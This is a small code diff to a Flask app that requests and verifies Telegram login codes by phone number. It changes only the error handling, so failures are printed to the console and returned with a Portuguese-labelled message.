@@ -24,7 +24,6 @@ clients = {}
 def index():
     # AQUI ESTÁ A CORREÇÃO: Puxa o HTML da pasta static
     return send_from_directory('static', 'index.html')
-
 @app.route('/request_code', methods=['POST'])
 def request_code():
     data = request.json
@@ -39,7 +38,9 @@ def request_code():
         clients[phone] = {'client': client, 'phone_code_hash': sent_code.phone_code_hash}
         return jsonify({"success": True}), 200
     except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
+        # AQUI ELE VAI CUSPIR O ERRO NA TELA PRA NÓS VERMOS
+        print(f"ERRO NO TELEGRAM: {str(e)}") 
+        return jsonify({"success": False, "error": f"Bloqueio do Telegram: {str(e)}"}), 500
 
 @app.route('/verify_code', methods=['POST'])
 def verify_code():
